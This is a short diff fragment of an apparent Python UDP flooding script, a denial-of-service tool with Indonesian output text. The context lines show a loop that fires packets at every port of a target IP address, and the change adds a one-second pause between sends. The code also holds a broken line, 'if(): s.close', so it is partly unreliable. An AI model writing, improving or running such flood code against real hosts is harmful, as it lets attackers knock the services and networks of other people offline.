@@ -71,6 +71,7 @@ while True:
     for port in range(1, 65534):
         white.sendto(bytes, (ip, port))
         sent = sent + 1
+        time.sleep(1)
         print("\033[94m[IDRIB] \033[97m%s  \033[31m[Ngirim ke]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
     if():
         s.close
